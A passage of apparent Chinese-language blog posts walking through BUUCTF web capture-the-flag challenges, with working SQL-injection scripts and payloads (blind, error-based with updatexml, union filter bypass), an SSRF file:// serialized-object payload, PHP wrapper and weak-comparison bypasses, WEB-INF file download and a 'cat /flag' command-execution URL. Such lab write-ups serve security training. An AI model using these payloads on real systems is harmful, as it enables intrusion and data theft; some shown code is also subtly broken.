a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      param = b</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">  s1.release() </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:<span class="comment">#加入多线程</span></span><br><span class="line">  t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">  t.start()</span><br></pre></td></tr></table></figure><p>找到之后payload：</p><p>[<a href="http://da91d275-8eeb-4b60-bf11-81cdbc3f629b.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag%5D">http://da91d275-8eeb-4b60-bf11-81cdbc3f629b.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag]</a>(<a href="http://da91d275-8eeb-4b60-bf11-81cdbc3f629b.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat">http://da91d275-8eeb-4b60-bf11-81cdbc3f629b.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat</a> /flag)</p><p><img src="https://img01.sogoucdn.com/app/a/100520146/2B010886F89DFFF146B9FFB4FC6E4B8B"></p><h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a><strong>[RoarCTF 2019]Easy Java</strong></h3><p>打开题目是一个登录界面</p><p><img src="https://img03.sogoucdn.com/app/a/100520146/ECA794D949F25243762A03226037D215"> </p><p>但是我们不知道用户名和密码，但是有个帮助，点击之后</p><p><img src="https://img03.sogoucdn.com/app/a/100520146/06DEED42583A90AC99965EE74E6C980D"> </p><p>似乎是文件包含，尝试读取/etc/passwd</p><p><img src="https://img01.sogoucdn.com/app/a/100520146/7D5DCBA6CF13732AE864E1FF8EDBC218"> </p><p>没有读取到，</p><p>百度一下java.io.FileNotFoundException:{help.docx}，说这个是报错，是因为找不到文件路径的问题。但是这里不知道怎么解决，看了wp之后，说是，看到java.io.FileNotFoundException:{help.docx}这个报错，就是要切换请求方式。。。。。。挺迷的，这里是把get变成post。</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/E0629F5886A04A8088F157332C3D58D1"> </p><p>有个pk文件，应该是可以下载的</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/5C5D477548870F2B1BAC372B3B1FF102"> </p><p>就这吗？</p><p><img src="https://img01.sogoucdn.com/app/a/100520146/9FDDAE941CE0D31FBA57B2815995B4A0"> </p><p>尝试一下包含其他文件，</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/44FE9B0A72B28FB624066B1C0B4279CB"> </p><p>出现了报错信息</p><p>查看了wp</p><p><strong>是考察WEB-INF/web.xml泄露</strong></p><blockquote><p>WEB-INF主要包含一下文件或目录:</p><p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p><p>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</p><p>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</p><p>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</p><p>/WEB-INF/database.properties：数据库配置文件</p></blockquote><p>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p><p><strong>漏洞成因：</strong></p><p>​        通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p><p>接下来我们还是用post的方法，访问WEB-INF/web.xml</p><p><img src="https://img01.sogoucdn.com/app/a/100520146/51FD765AFB6E9C12378E260B54E1DEAC"> </p><p>将com.wm.ctf.FlagController转化格式，变成WEB-INF/classes/com/wm/ctf/FlagController.class</p><p>Payload: Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class</p><p><img src="https://img01.sogoucdn.com/app/a/100520146/4D810033E21FDB57C1ACEDB119BA1EC8"> </p><p>将base64解码之后，</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/11F82484EDD46887C2BFAFF426A5169E"> </p>]]></content>
    
    
    <summary type="html">&lt;p&gt;[GXYCTF2019]BabySQli1–union select特性&lt;/p&gt;
&lt;p&gt;[BUUCTF 2018]Online Tool–绕过escapeshellarg、escapeshellcmd&lt;/p&gt;
&lt;p&gt;[强网杯 2019]高明的黑客–shell脚本筛查&lt;/p&gt;
&lt;p&gt;[RoarCTF 2019]Easy Java–WEB-INF配置文件&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
    <category term="SQLi" scheme="http://example.com/tags/SQLi/"/>
    
    <category term="java-WEB-INF" scheme="http://example.com/tags/java-WEB-INF/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-web-5</title>
    <link href="http://example.com/2021/05/16/buuctf/buuctf-web-5/"/>
    <id>http://example.com/2021/05/16/buuctf/buuctf-web-5/</id>
    <published>2021-05-16T07:23:20.000Z</published>
    <updated>2021-05-23T11:06:04.741Z</updated>
    
    <content type="html"><![CDATA[<p>[CISCN2019 华北赛区 Day2 Web1]Hack World1</p><p>[极客大挑战 2019]HardSQL1</p><p>[网鼎杯 2018]Fakebook1–SSRF</p><span id="more"></span><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World1"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World1" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World1"></a><strong>[CISCN2019 华北赛区 Day2 Web1]Hack World1</strong></h3><p><img src="https://ae01.alicdn.com/kf/U16dde65cfe4e426b8d058300efbfd5e4M.jpg"> </p><p>测试输入，id=1，返回Hello, glzjin wants a girlfriend.，id=2时,回显Do you want to be my girlfriend?，&gt;=3的时候是Error Occured When Fetch Result.，尝试单引号，报bool(false)，双引号SQL Injection Checked，被过滤了，包括空格、or、union等都被过滤。</p><p>但是在输入id=3/3时，返回Hello, glzjin wants a girlfriend，说明是数字型的sql注入。</p><p>id=1/(1)，也可以正常返回，说明括号没有过滤，这样的话很多函数就可以使用，</p><p>测试length</p><p><img src="https://ae01.alicdn.com/kf/U468b628e677743c1b1f6376d7061fed7a.jpg"> </p><p><img src="https://ae01.alicdn.com/kf/U3b18d907345740398e602397da1614c57.jpg"> </p><p>可以看到length()是可以正常使用的，测试出的数据库长度为11</p><p>接下来，测试数据库名字id=(ascii(substr(database(),1,1))&gt;32)</p><p><img src="https://ae01.alicdn.com/kf/U766da8d166e84e878e8768bab110fe8b7.jpg"> </p><p>写一个脚本进行爆库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&#x27;http://2bb3c1a2-93b6-41de-8204-87b500dce5fd.node3.buuoj.cn/&#x27;</span></span><br><span class="line">db_name=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">12</span>,<span class="number">1</span>):</span><br><span class="line">​<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>,<span class="number">1</span>):</span><br><span class="line">​data=&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i,j)&#125;</span><br><span class="line">​res=requests.post(url,data=data).text</span><br><span class="line">​time.sleep(<span class="number">1</span>)</span><br><span class="line">​<span class="comment">#print(j)</span></span><br><span class="line">​<span class="keyword">if</span> <span class="string">&#x27;Hello, glzjin wants a girlfriend&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">​db_name=db_name+<span class="built_in">chr</span>(j)</span><br><span class="line">​<span class="built_in">print</span>(db_name)</span><br><span class="line">​time.sleep(<span class="number">1</span>)</span><br><span class="line">​<span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/Uc851c8f445d74118b1a7b7e5127aa2b9o.jpg"> </p><p>由于题目直接说了flag在flag中</p><p><img src="https://ae01.alicdn.com/kf/Uec3b933857324ad5936a8d8bce47f40ep.jpg"> </p><p>所以可以直接尝试爆出flag，先进行测试，由于不能用空格，用括号括起来</p><p>id=(ascii(substr((select(flag)from(flag)),1,1))&gt;32)</p><p><img src="https://ae01.alicdn.com/kf/U0ff7f7ba65a04484be53730a3bd028d6I.jpg"> </p><p>id=(ascii(substr((select(flag)from(flag)),1,1))&gt;111)</p><p><img src="https://ae01.alicdn.com/kf/Ucd768a211bd04ca588c25f32d7f93264r.jpg"> </p><p>写脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">f=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>,<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">44</span>,<span class="number">126</span>,<span class="number">1</span>):</span><br><span class="line">data=&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i,j)&#125;</span><br><span class="line">res=requests.post(url,data=data).text</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;Hello, glzjin wants a girlfriend&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">f=f+<span class="built_in">chr</span>(j)</span><br><span class="line"><span class="comment">#print(i)</span></span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">Break</span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/Ub2e5aaa192ff4b4f92038b80cb51fb980.jpg"> </p><h3 id="极客大挑战-2019-HardSQL1"><a href="#极客大挑战-2019-HardSQL1" class="headerlink" title="[极客大挑战 2019]HardSQL1"></a><strong>[极客大挑战 2019]HardSQL1</strong></h3><p><img src="https://ae01.alicdn.com/kf/U4ed92c47846c42e0858b8c264233bf77d.jpg"> </p><p>Sql注入，先试试’和”</p><p><img src="https://ae01.alicdn.com/kf/Ub6fc0ff47e5247819caa7e7527ab5335X.jpg"> </p><p>发现单引号有报错，双引号没有，没提示有括号，所以应该是普通单引号闭合的字符型注入。</p><p><img src="https://ae01.alicdn.com/kf/U0fb158491485453fa5328546aab31d65I.jpg"> </p><p>发现如and/空格/union/select/=//**/等都被过滤了</p><p>我们试试报错注入</p><p><strong>爆库</strong></p><p>?username=1&amp;password=1’or(updatexml(1,concat(0x7e,database(),0x7e),1))%23</p><p><img src="https://ae01.alicdn.com/kf/Ub1ac46df9c2541f6baed4eb3f6ea517be.jpg"> </p><p><strong>爆表</strong></p><p>?username=1&amp;password=1’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)in(database()))),0x7e),1))%23</p><p>等于号不能用，可以使用in或者like</p><p><img src="https://ae01.alicdn.com/kf/Ub6fb95fd55c14a20934ec5276c9c68616.jpg"> </p><p><strong>爆列</strong></p><p>?username=1&amp;password=1’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)in(‘H4rDsq1’))),0x7e),1))%23</p><p><img src="https://ae01.alicdn.com/kf/U011e9b1b5bb34cd695c25464569c0357U.jpg"> </p><p>查数据</p><p>?username=1&amp;password=1’or(updatexml(1,concat(0x7e,(select(group_concat(username,’-‘,password))from(H4rDsq1)),0x7e),1))%23</p><p><img src="https://ae01.alicdn.com/kf/Ud64190349a864c6392e3ea5b8a131a001.jpg"> </p><p>。。。。。。。只显示了一半，不显示username试试</p><p><img src="https://ae01.alicdn.com/kf/U7fe82ec2d36640078c9e7604a9eea01cy.jpg"> </p><p>还是不行。。。。。。</p><p>看wp说用right()语句在查询后面部分  这样就可以了 又get到了新技能。。。。</p><p>只查到了一半再用left()right()语句查询拼接</p><p>?username=1&amp;password=1’or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))%23</p><p><img src="https://ae01.alicdn.com/kf/U07df64bc4de54c08b3a091140c7d606aG.jpg"> </p><p>拼接</p><p>flag{ad86fce3-d802-4f16-b167-6f587c6298de}</p><h3 id="网鼎杯-2018-Fakebook1"><a href="#网鼎杯-2018-Fakebook1" class="headerlink" title="[网鼎杯 2018]Fakebook1"></a>[网鼎杯 2018]Fakebook1</h3><p><img src="https://img02.sogoucdn.com/app/a/100520146/673B0725B67E4611C088CAF7D275A4D8"> </p><p>查看源码，可以看到有base64的信息</p><p>新建了个用户进行简单的测试，可以看到百度的网址是被解析了的，而且在get参数那里可能存在SQL注入，可以试试</p><p>单引号</p><p><img src="https://img03.sogoucdn.com/app/a/100520146/86D8F8D71AB8E2D54D4A74DA90ACCA27"> </p><p>双引号</p><p><img src="https://img01.sogoucdn.com/app/a/100520146/3017F723C7253232BF9640D85BA7F715"> </p><p>应该是布尔型</p><p>?no=1 and 1=1</p><p><img src="https://img04.sogoucdn.com/app/a/100520146/75D8F17571DD4EA5151B3D1E5A61385F"> </p><p>?no=1 and 1=2 </p><p>?no=1 order by 5 </p><p>经测试一共四列</p><p>但是发现union select做了过滤，可以使用union/**/select绕过 </p><p>可以看到2处会回显</p><p>查看数据库?no=-1 union/**/select 1,database(),3,4#</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/5B8A7A7F5DB69E43C06A39EC9115A74B"> </p><p>爆表</p><p>?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#</p><p><img src="file:///C:\Users\17295\AppData\Local\Temp\ksohtml3900\wps9.jpg" alt="img"> </p><p>爆列</p><p>?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=’users’# </p><p>查数据</p><p>?no=-1 union/**/select%201,group_concat(no,’-‘,username,’-‘,passwd,’-‘,data),3,4 from fakebook.users#</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/94F86E21BFAE8920D71350C453656192"> </p><p>额、、、、、、没有想象中flag，但是这是我们之前注册时提交的数据经过序列化之后的数据。</p><p>看来还是需要其他办法的，</p><p>看了网上的wp，扫描一下网站</p><p><img src="https://img04.sogoucdn.com/app/a/100520146/A753512E7AE52DE3AEB60CBF7A0D054E"> </p><p>在robots.txt中可以看到</p><p><img src="https://img04.sogoucdn.com/app/a/100520146/399CA5C250C7D4221BE01332FB3ADDFB"> </p><p>访问试试，下载得到了源码</p><p><img src="https://img04.sogoucdn.com/app/a/100520146/561DCE9356977B941EC109EFA8ACE520"> </p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">​    <span class="variable">$ch</span> = curl_init();                  <span class="comment">//初始化一个curl会话</span></span><br><span class="line">​    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);         <span class="comment">//设置需要抓取的URL</span></span><br><span class="line">​    curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);     <span class="comment">//设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上</span></span><br><span class="line">​    <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);               <span class="comment">//运行cURL，请求网页</span></span><br><span class="line">​    <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">​    <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">​      <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">​    &#125;</span><br><span class="line">   curl_close(<span class="variable">$ch</span>);      <span class="comment">//关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄</span></span><br><span class="line">​    <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读源码可以看到</p><p>输入的blog经过了isValidBlog（）函数的过滤</p><p>get()函数存在ssrf漏洞</p><p>当调用get方法时会访问某个url得到信息，如果该url被恶意利用，比如利用file协议，就可以读取任意文件。</p><p>而在刚刚上面的注出的数据，可以发现得到的数据是进过序列化之后的数据，所以然后尝试利用ssrf漏洞读取flag.php。</p><p>构造payload为：</p><p>/view.php?no=0 union/**/select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:19;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’</p><p><img src="https://img03.sogoucdn.com/app/a/100520146/F5ED2642100EBAE1BD9889B926F2EA9F"> </p><p>查看源码，base64解码即可得到flag</p><p><img src="https://img04.sogoucdn.com/app/a/100520146/132928FCCF4D7C3EF161B596A7B00C00"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;[CISCN2019 华北赛区 Day2 Web1]Hack World1&lt;/p&gt;
&lt;p&gt;[极客大挑战 2019]HardSQL1&lt;/p&gt;
&lt;p&gt;[网鼎杯 2018]Fakebook1–SSRF&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
    <category term="SQLi" scheme="http://example.com/tags/SQLi/"/>
    
    <category term="SSRF" scheme="http://example.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-web-4</title>
    <link href="http://example.com/2021/05/16/buuctf/buuctf-web-4/"/>
    <id>http://example.com/2021/05/16/buuctf/buuctf-web-4/</id>
    <published>2021-05-16T04:48:09.000Z</published>
    <updated>2021-05-23T11:06:09.811Z</updated>
    
    <content type="html"><![CDATA[<p>[BJDCTF2020]Easy MD51</p><p>[极客大挑战 2019]BuyFlag1</p><p>[ZJCTF 2019]NiZhuanSiWei1</p><span id="more"></span><h3 id="极客大挑战-2019-BuyFlag1"><a href="#极客大挑战-2019-BuyFlag1" class="headerlink" title="[极客大挑战 2019]BuyFlag1"></a><strong>[极客大挑战 2019]BuyFlag1</strong></h3><p><img src="https://ae01.alicdn.com/kf/U2e18b859ab4f4a9fa0e1dae8b54960c5S.jpg"> </p><p>查看源码可以看到部分源码</p><p><img src="https://ae01.alicdn.com/kf/U32b252745017482fa3e302b9baaca163u.jpg"> </p><p>Post提交money和password，要求password不能是数字，但又要求password==404，</p><p>弱类型比较，所以只需要构造password=404aaa即可</p><p>构造报文</p><p><img src="https://ae01.alicdn.com/kf/U82af621a9c97407ea70fccba7f775052w.jpg"> </p><p>回显是已经绕过了前两个验证</p><p><img src="https://ae01.alicdn.com/kf/U710634cd78dc415e996d362acd48639bD.jpg"> </p><p>但是又说numbers太长了，那我们使用科学计数法表示money</p><p>money=1e10&amp;password=404aaa</p><p><img src="https://ae01.alicdn.com/kf/U671ea8e7ca5a4645a3016a8fd97d4e30u.jpg"> </p><h3 id="BJDCTF2020-Easy-MD51"><a href="#BJDCTF2020-Easy-MD51" class="headerlink" title="[BJDCTF2020]Easy MD51"></a><strong>[BJDCTF2020]Easy MD51</strong></h3><p>只有一个输入框，随便输入进行测试，看到一个hint</p><p><img src="https://ae01.alicdn.com/kf/Ud2fe4094d433484991b7738e4b74d984K.jpg"> </p><p>select * from ‘admin’ where password=md5($pass,true)</p><p>md5的语法如下</p><p><img src="https://ae01.alicdn.com/kf/Uf4eb46bf55444ddf982be6a2aa530fd7M.jpg"> </p><p>指定true之后，返回的是16字符的二进制格式</p><p><strong>这里又学到新知识了</strong></p><p>我们需要找到一个字符串，经过md5加密后返回的字符串能够构造成一个万能密码。</p><p><strong>原理：</strong></p><p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。</p><p>要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。</p><p>当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）</p><p>在网上的wp中看到的字符串****ffifdyop，****经过MD5之后，会变成’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c，</p><p><img src="https://ae01.alicdn.com/kf/U206c60582fc54b78a50ad229de6eb634n.jpg"> </p><p>可以看到真的出来了’or’6<xxxx>，挺神奇的，</p><p>拼接成：select * from ‘admin’ where password=’’or’6<xxxx>’</p><p>在输入框中输入ffifdyop，跳转到新的页面</p><p><img src="https://ae01.alicdn.com/kf/Uae762151b95b4131bbaa2ca0ee5ac7f3I.jpg"> </p><p>查看源码，发现源码</p><p><img src="https://ae01.alicdn.com/kf/U5e581ccfe0bd43b4bfbbb435a77a8c11H.jpg"> </p><p>要求a!=b&amp;&amp;md5(a)==md5(b)，首先这是弱比较，我们可以找两个字符串，经过md5加密后前面的数字是相同的即可，比如：</p><p>s878926199a</p><p>0e545993274517709034328855841020</p><p>s155964671a</p><p>0e342768416822451524974117254469</p><p><img src="https://ae01.alicdn.com/kf/U33232dc4238c4be4b042b54a00b69e9ec.jpg"> </p><p>或者使用数组绕过?a[]=1&amp;b[]=2</p><p><img src="https://ae01.alicdn.com/kf/Uc7092e31962e400bbff4e5650ee67015N.jpg"> </p><p>又出现了新的源码，和上面一样，只不过这次是强等于，但是还是可以使用数组绕过，用post提交</p><p><img src="https://ae01.alicdn.com/kf/U47d9748fccaa451aa2339d1e3816c39aa.jpg"> </p><h3 id="ZJCTF-2019-NiZhuanSiWei1"><a href="#ZJCTF-2019-NiZhuanSiWei1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei1"></a><strong>[ZJCTF 2019]NiZhuanSiWei1</strong></h3><p>上来就是源码</p><p><img src="https://ae01.alicdn.com/kf/U93eac10092fd4e51a0fde2ee5ba4a337v.jpg"> </p><p>Get提交text并且text=welcome to the zjctf，file参数中不能包含/flag/，然后可以包含file，password=unserialize(password)</p><p>总体来说就是三个绕过点，</p><p>第一个可以使用data://协议</p><p>text=data://text/plain,welcome to the zjctf</p><p>file是需要文件包含，但是不能直接包含flag，提示了一个useless.php文件，我们可以包含这个文件看看，直接file=useless.php看不到源码。伪协议读取</p><p>file=php://filter/read=convert.base64-encode/resource=useless.php</p><p>第二步的payload：</p><p>text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</p><p><img src="https://ae01.alicdn.com/kf/U98ef91913fed4637bd10b660c1fe8b18o.jpg"> </p><blockquote><p>PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=</p></blockquote><p>base64解码之后，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">     <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>我们发现useless.php是一个类，并且提示我们flag在flag.php</p><p>明确了文件位置就可以开始构造pop链。</p><p>如果类定义了toString方法，就能在测试时，echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">​      <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">​      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">​      <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">​    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$demo</span> = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="variable">$u</span> = serialize(<span class="variable">$demo</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/U237180757e12475e8968214ea732546af.jpg"> </p><p>得到O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p><p>构造最终payload</p><p>?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p><p><img src="https://ae01.alicdn.com/kf/U89161240a62d4cae9c4c6a31a5a4fcd6R.jpg"> </p><p>查看源码</p><p><img src="https://ae01.alicdn.com/kf/U36c57646745247e785d5030dd867a0aez.jpg"> </p>]]></content>
    
    
    <summary type="html">&lt;p&gt;[BJDCTF2020]Easy MD51&lt;/p&gt;
&lt;p&gt;[极客大挑战 2019]BuyFlag1&lt;/p&gt;
&lt;p&gt;[ZJCTF 2019]NiZhuanSiWei1&lt;/p&gt;</summary>
    
    
    
